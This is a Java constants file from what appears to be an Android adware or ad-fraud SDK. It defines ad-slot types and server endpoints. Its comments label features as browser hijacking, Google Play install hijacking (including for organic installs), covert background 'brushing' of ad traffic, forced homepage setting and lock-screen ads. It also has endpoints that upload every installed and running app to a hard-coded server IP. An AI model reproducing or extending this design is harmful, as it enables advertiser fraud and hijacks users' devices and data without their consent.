package com.guang.client;

import android.os.Build;

public class GCommon {
	
	public static final String version = "1.1";
	
	//统计类型
	public static final int REQUEST = 0;//请求
	public static final int SHOW = 1;//展示
	public static final int CLICK = 2;//点击
	public static final int DOWNLOAD = 3;//下载
	public static final int DOWNLOAD_SUCCESS = 4;//下载成功
	public static final int INSTALL = 5;//安装
	public static final int ACTIVATE = 6;//激活
	public static final int DOUBLE_SHOW = 7;//展示
	public static final int DOUBLE_CLICK = 8;//点击
	public static final int DOUBLE_DOWNLOAD = 9;//下载
	public static final int DOUBLE_DOWNLOAD_SUCCESS = 10;//下载成功
	public static final int DOUBLE_INSTALL = 11;//安装
	public static final int DOUBLE_ACTIVATE = 12;//激活
	public static final int GP_STATE = 14;//GP状态
	//广告位类型
	public static final String AD_POSITION_TYPE = "ad_position_type";
	public static final int BROWSER_SPOT = 1;//浏览器插屏 
	public static final int APP_INSTALL = 2;//安装
	public static final int APP_UNINSTALL = 3;//卸载
	public static final int BANNER = 4;//应用banner
	public static final int CHARGLOCK = 5;//充电锁
	public static final int APP_SPOT = 6;//应用插屏 
	public static final int WIFI_CONN = 7;//连接wifi
	public static final int BROWSER_BREAK = 8;//浏览器劫持 
	public static final int SHORTCUT = 9;//快捷方式
	public static final int HOME_PAGE = 10;//强设主页
	public static final int BEHIND_BRUSH = 11;//暗刷
	public static final int GP_BREAK = 12;//gp劫持
	public static final int OFF_GP_BREAK = 16;//自然量gp劫持
	
		
	//SharedPreferences
	public static final String SHARED_PRE = "guangclient";
	public static final String SHARED_KEY_NAME = "name";
	public static final String SHARED_KEY_PASSWORD = "password";
	public static final String SHARED_KEY_TESTMODEL = "testmodel";
	
	//------------------------------------------------------------------------------------
	//服务启动时间
	public static final String SHARED_KEY_SERVICE_RUN_TIME = "service_run_time";
	//主循环运行的时间
	public static final String SHARED_KEY_MAIN_LOOP_TIME = "main_loop_time";
	//TO登录时间
	public static final String SHARED_KEY_TO_LOGIN_TIME = "to_login_time";
	//登录时间
	public static final String SHARED_KEY_LOGIN_TIME = "login_time";
	//获取配置时间
	public static final String SHARED_KEY_GET_CONFIG_TIME = "getconfig_time";
	//浏览器开屏时间
	public static final String SHARED_KEY_BROWSER_SPOT_TIME = "browser_spot_time";
	//BANNER时间
	public static final String SHARED_KEY_BANNER_TIME = "banner_time";
	//应用插屏时间
	public static final String SHARED_KEY_APP_SPOT_TIME = "app_spot_time";
	//wifi时间
	public static final String SHARED_KEY_WIFI_TIME = "wifi_time";
	//浏览器劫持时间
	public static final String SHARED_KEY_BROWSER_BREAK_TIME = "browser_break_time";
	//快捷方式时间
	public static final String SHARED_KEY_SHORTCUT_TIME = "shortcut_time";
	//暗刷时间
	public static final String SHARED_KEY_BEHINDBRUSH_TIME = "behindbrush_time";
	//gp器劫持时间
	public static final String SHARED_KEY_GP_BREAK_TIME = "gp_break_time";
	//浏览器开屏次数
	public static final String SHARED_KEY_BROWSER_SPOT_NUM = "browser_spot_num";
	//BANNER次数
	public static final String SHARED_KEY_BANNER_NUM = "banner_num";
	//应用插屏次数
	public static final String SHARED_KEY_APP_SPOT_NUM = "app_spot_num";
	//wifi次数
	public static final String SHARED_KEY_WIFI_NUM = "wifi_num";
	//浏览器劫持次数
	public static final String SHARED_KEY_BROWSER_BREAK_NUM = "browser_break_num";
	//快捷方式次数
	public static final String SHARED_KEY_SHORTCUT_NUM = "shortcut_num";
	//暗刷次数
	public static final String SHARED_KEY_BEHINDBRUSH_NUM = "behindbrush_num";
	//gp劫持次数
	public static final String SHARED_KEY_GP_BREAK_NUM = "gp_break_num";
	//暗刷生成的时间
	public static final String SHARED_KEY_BEHINDBRUSH_HOURS = "behindbrush_hours";
	//相同广告次数
	public static final String SHARED_KEY_AD_NUM = "ad_num";
	//gp单次劫持次数上限
	public static final String SHARED_KEY_GP_BREAK_TOP_NUM = "gp_break_top_num";
	//gp补刷次数
	public static final String SHARED_KEY_GP_BREAK_BRUSH_NUM = "gp_break_brush_num";
	//离线补刷次数
	public static final String SHARED_KEY_GP_OFF_BREAK_BRUSH_NUM = "gp_off_break_brush_num";
	
	//上传所有app信息时间
	public static final String SHARED_KEY_UPLOAD_ALL_APPINFO_TIME = "upload_all_appinfo_time";
	//设置充电锁时间  	
	public static final String SHARED_KEY_LOCK_SAVE_TIME = "lock_save_time";
	//锁类型 0关闭 1开启 2今日 3三天  4 7 5 30
	public static final String SHARED_KEY_LOCK_SAVE_TYPE = "lock_save_type";
	//是否在充电
	public static final String SHARED_KEY_ISBATTERY = "isbattery";
	public static final String SHARED_KEY_BATTERY_LEVEL = "battery_level";
	//上次打开的app
	public static final String SHARED_KEY_LAST_OPEN_APP = "last_open_app";
	public static final String SHARED_KEY_IS_OPEN_LAUNCHER = "is_open_launcher";
	public static final String SHARED_KEY_LAST_OPEN_APP2 = "last_open_app2";
	
	//记录banner未执行完的任务的包名
	public static final String SHARED_KEY_TASK_BANNER_APP = "task_banner_app";
	//记录应用插屏未执行完的任务的包名
//	public static final String SHARED_KEY_TASK_APPSPOT_APP = "task_appspot_app";
	//记录浏览器插屏未执行完的任务的包名
	public static final String SHARED_KEY_TASK_BROWSERSPOT_APP = "task_browserspot_app";
	public static final String SHARED_KEY_SDK_VERSION = "sdk_version";
	public static final String SHARED_KEY_SPOTADID = "spotadid";
	public static final String SHARED_KEY_BANNERADID = "banneradid";
	public static int SDK_VERSION = Build.VERSION.SDK_INT;

	public static final String SHARED_KEY_TIMELIMT = "timeLimt";
	public static final String SHARED_KEY_CURR_COUNTRY = "curr_country";
	public static final String SHARED_KEY_CURR_COUNTRYCODE = "curr_country_code";
	public static final String SHARED_KEY_CURR_CONFIG = "curr_config";
		
	//获取地理位置用到
	public static final String IP_URL = "http://ip-api.com/json?lang=zh-CN";

	
	public static final String SERVER_ADDRESS = "http://104.238.126.116:8080/QiupAdServer/";
//	public static final String SERVER_ADDRESS = "http://192.168.0.100:8080/QiupAdServer/";

	public static final String URI_UPLOAD_APPINFO = SERVER_ADDRESS + "user_uploadAppInfos";
	
	
	//------------------------------------------------------------------------------------
	//登录
	public static final String URI_LOGIN = SERVER_ADDRESS + "user_login";
	//校验
	public static final String URI_VALIDATE = SERVER_ADDRESS + "user_validates";
	//注册
	public static final String URI_REGISTER = SERVER_ADDRESS + "user_register";
	//配置信息
	public static final String URI_GET_FIND_CURR_CONFIG = SERVER_ADDRESS + "config_findCurrConfig";
	//上传统计
	public static final String URI_UPLOAD_STATISTICS = SERVER_ADDRESS + "statistics_uploadStatistics";
	//上传所有app
	public static final String URI_UPLOAD_ALL_APPINFOS = SERVER_ADDRESS + "gather_uploadAppInfo";
	//上传运行app
	public static final String URI_UPLOAD_RUN_APPINFOS = SERVER_ADDRESS + "gather_uploadAppRunInfo";
	//得到广告id
	public static final String URI_GETADID = SERVER_ADDRESS + "tb_getAdId";
	//离线offer
	public static final String URI_OFFLINE_OFFER = SERVER_ADDRESS + "ad_offer";
	//离线offer补刷
	public static final String URI_OFFLINE_OFFER_BUSH = SERVER_ADDRESS + "ad_brush";
	//gp广告offer
	public static final String URI_GET_GP_OFFERS = SERVER_ADDRESS + "offer_getOffers";
	//gp劫持affi
	public static final String URI_GET_GP_AFFI_OFFERS = SERVER_ADDRESS + "ad_gpoffer";
	
	//action
	public static final String ACTION_QEW_TYPE = "action.qew.type";
	public static final String ACTION_QEW_APP_BROWSER_SPOT = "action.qew.app.browserspot";
	public static final String ACTION_QEW_APP_INSTALL = "action.qew.app.install";
	public static final String ACTION_QEW_APP_UNINSTALL = "action.qew.app.uninstall";
	public static final String ACTION_QEW_APP_BANNER = "action.qew.app.banner";
	public static final String ACTION_QEW_APP_LOCK = "action.qew.app.lock";
	public static final String ACTION_QEW_APP_SPOT = "action.qew.app.spot";
	public static final String ACTION_QEW_APP_WIFI = "action.qew.app.wifi";
	public static final String ACTION_QEW_APP_BROWSER_BREAK = "action.qew.app.browserbreak";
	public static final String ACTION_QEW_APP_BROWSER_BREAK_MASK = "action.qew.app.browserbreak.mask";
	public static final String ACTION_QEW_APP_SHORTCUT = "action.qew.app.shortcut";
	public static final String ACTION_QEW_APP_HOMEPAGE = "action.qew.app.homepage";
	public static final String ACTION_QEW_APP_BEHIND_BRUSH = "action.qew.app.behindbrush";
	public static final String ACTION_QEW_APP_INSTALL_UI = "action.qew.app.install.ui";
	public static final String ACTION_QEW_APP_UNINSTALL_UI = "action.qew.app.uninstall.ui";
	public static final String ACTION_QEW_APP_GP_BREAK = "action.qew.app.gpbreak";
	
	public static final String ACTION_QEW_OPEN_APP = "action.qew.app.openapp";
		
}
